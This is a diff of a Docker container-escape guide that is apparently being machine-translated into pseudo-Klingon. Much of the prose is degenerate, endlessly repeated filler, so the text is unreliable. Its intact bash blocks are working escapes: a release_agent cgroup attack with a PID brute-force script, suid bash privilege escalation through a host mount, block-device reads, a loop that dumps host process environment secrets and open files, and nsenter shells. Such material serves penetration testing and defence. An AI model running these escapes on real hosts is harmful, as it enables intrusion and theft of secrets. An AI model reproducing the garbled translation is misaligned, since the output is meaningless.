qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'no
 ```bash
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -246,7 +181,7 @@ chmod a+x /cmd
 
 # Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
 # By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
-# The script on the host will execute after /bin/sh exits 
+# The script on the host will execute after /bin/sh exits
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
 # Reads the output
@@ -254,20 +189,21 @@ cat /output
 ```
 {% endcode %}
 
-Find an **explanation of the technique** in:
+**tlhIngan Hol:**
+
+**QapHa'** **ghItlh** **'e'** **yIqaw**:
 
 {% content-ref url="docker-release_agent-cgroups-escape.md" %}
 [docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
 {% endcontent-ref %}
 
-#### Privileged Escape Abusing release\_agent without known the relative path - PoC3
+#### **Privileged Escape** **release\_agent** **ghItlh** **relative path** **jatlh** - **PoC3**
 
-In the previous exploits the **absolute path of the container inside the hosts filesystem is disclosed**. However, this isn’t always the case. In cases where you **don’t know the absolute path of the container inside the host** you can use this technique:
+**exploits** **previous** **absolute path** **container** **host filesystem** **jatlh** **DIvI'**. **However**, **qaStaHvIS** **absolute path** **container** **host** **jatlh** **DIvI'** **jatlh** **vaj** **DIvI'** **yIlo'** **technique** **vaj**:
 
 {% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
 [release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
 {% endcontent-ref %}
-
 ```bash
 #!/bin/sh
 
@@ -306,20 +242,20 @@ echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release
 TPID=1
 while [ ! -f ${OUTPUT_PATH} ]
 do
-  if [ $((${TPID} % 100)) -eq 0 ]
-  then
-    echo "Checking pid ${TPID}"
-    if [ ${TPID} -gt ${MAX_PID} ]
-    then
-      echo "Exiting at ${MAX_PID} :-("
-      exit 1
-    fi
-  fi
-  # Set the release_agent path to the guessed pid
-  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
-  # Trigger execution of the release_agent
-  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
-  TPID=$((${TPID} + 1))
+if [ $((${TPID} % 100)) -eq 0 ]
+then
+echo "Checking pid ${TPID}"
+if [ ${TPID} -gt ${MAX_PID} ]
+then
+echo "Exiting at ${MAX_PID} :-("
+exit 1
+fi
+fi
+# Set the release_agent path to the guessed pid
+echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
+# Trigger execution of the release_agent
+sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
+TPID=$((${TPID} + 1))
 done
 
 # Wait for and cat the output
@@ -327,9 +263,7 @@ sleep 1
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 ```
-
-Executing the PoC within a privileged container should provide output similar to:
-
+PoC-чIwI' vItlhutlhlaHchugh vItlhutlh. vItlhutlhlaHchugh PoC-чIwI' vItlhutlhlaHchugh vItlhutlh.
 ```bash
 root@container:~$ ./release_agent_pid_brute.sh
 Checking pid 100
@@ -357,37 +291,21 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
-
 #### Privileged Escape Abusing Sensitive Mounts
 
-There are several files that might mounted that give **information about the underlaying host**. Some of them may even indicate **something to be executed by the host when something happens** (which will allow a attacker to escape from the container).\
-The abuse of these files may allow that:
-
-* release\_agent (already covered before)
-* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
-* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
-* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
-* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)
-
-However, you can find **other sensitive files** to check for in this page:
-
-{% content-ref url="sensitive-mounts.md" %}
-[sensitive-mounts.md](sensitive-mounts.md)
-{% endcontent-ref %}
-
-### Arbitrary Mounts
-
-In several occasions you will find that the **container has some volume mounted from the host**. If this volume wasn’t correctly configured you might be able to **access/modify sensitive data**: Read secrets, change ssh authorized\_keys…
-
+**QIb** **qawHaq** **qarDaq** **qo'noS** **DIvI'**. **chay'** **qarDaq** **qo'noS** **DIvI'** **'e'** **qarDaq** **qo'noS** **DIvI'** **'e'** **'e'** **(ghaH 'e'** **qarDaq** **qo'noS** **DIvI'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
-
 ### Privilege Escalation with 2 shells and host mount
 
 If you have access as **root inside a container** that has some folder from the host mounted and you have **escaped as a non privileged user to the host** and have read access over the mounted folder.\
 You can create a **bash suid file** in the **mounted folder** inside the **container** and **execute it from the host** to privesc.
 
+### qo' vItlhutlh
+
+**root inside a container** vItlhutlh **ghaH** 'ej **host mounted** vItlhutlh **folder** vaj **escaped as a non privileged user to the host** 'ej **mounted folder** vItlhutlh **read access** 'e' vaj.\
+**bash suid file** vItlhutlh **mounted folder** vaj **container** vItlhutlh **create** 'ej **execute it from the host** to privesc.
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -395,7 +313,6 @@ chown root:root bash #From container as root inside mounted folder
 chmod 4777 bash #From container as root inside mounted folder
 bash -p #From non priv inside mounted folder
 ```
-
 ### Privilege Escalation with 2 shells
 
 If you have access as **root inside a container** and you have **escaped as a non privileged user to the host**, you can abuse both shells to **privesc inside the host** if you have the capability MKNOD inside the container (it's by default) as [**explained in this post**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
@@ -404,7 +321,6 @@ With such capability the root user within the container is allowed to **create b
 Docker safeguards against block device misuse within containers by enforcing a cgroup policy that **blocks block device read/write operations**. Nevertheless, if a block device is **created inside the container**, it becomes accessible from outside the container via the **/proc/PID/root/** directory. This access requires the **process owner to be the same** both inside and outside the container.
 
 **Exploitation** example from this [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
-
 ```bash
 # On the container as root
 cd /
@@ -422,7 +338,7 @@ su: Authentication failure
 (Ignored)
 augustus@3a453ab39d3d:/backend$ /bin/sh
 /bin/sh
-$ 
+$
 ```
 
 ```bash
@@ -437,22 +353,18 @@ augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_
 
 # The process ID is 1659 in this case
 # Grep for the sda for HTB{ through the process:
-augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda 
+augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
 HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
 ```
-
 ### hostPID
 
-If you can access the processes of the host you are going to be able to access a lot of sensitive information stored in those processes. Run test lab:
+**hostPID** (host process ID) is a feature in Docker that allows a container to access the processes running on the host system. By enabling this feature, a container can gain access to sensitive information stored in those processes. This can be a significant security risk as it can lead to privilege escalation and unauthorized access to sensitive data.
 
+To test the security of your Docker setup and check if the **hostPID** feature is enabled, you can set up a test lab environment.
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
-
-For example, you will be able to list the processes using something like `ps auxn` and search for sensitive details in the commands.
-
-Then, as you can **access each process of the host in /proc/ you can just steal their env secrets** running:
-
+Qatlh 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev.
 ```bash
 for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
 /proc/988058/environ
@@ -461,9 +373,7 @@ HOSTNAME=argocd-server-69678b4f65-6mmql
 USER=abrgocd
 ...
 ```
-
-You can also **access other processes file descriptors and read their open files**:
-
+**ghItlhvam** **'ej** **'oH** **Dochvam** **file descriptors** **'ej** **cha'logh** **open files** **'oH** **ghItlhvam** **'e'** **DIvI'**.
 ```bash
 for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
 less fds.txt
@@ -473,51 +383,44 @@ lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
 # You can open the secret filw with:
 cat /proc/635813/fd/4
 ```
-
-You can also **kill processes and cause a DoS**.
+**ghItlh** **DIr** **'ej** **DoS** **ghaH** **'e'** **DIvI'** **processes** **'oH** **vItlhutlh**.
 
 {% hint style="warning" %}
-If you somehow have privileged **access over a process outside of the container**, you could run something like `nsenter --target <pid> --all` or `nsenter --target <pid> --mount --net --pid --cgroup` to **run a shell with the same ns restrictions** (hopefully none) **as that process.**
+**vaj** **container** **Daq** **process** **'e'** **'oH** **'e'** **access** **ghaH** **vItlhutlh**, **nsenter --target <pid> --all** **yIlo'** **'ej** **nsenter --target <pid> --mount --net --pid --cgroup** **yIlo'** **'e'** **shell** **run** **'e'** **ns restrictions** **(hopefully none)** **'e'** **'ej** **process** **'e'** **'oH** **as** **shell** **run** **'e'**.
 {% endhint %}
 
 ### hostNetwork
-
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
+**hostIPC**
 
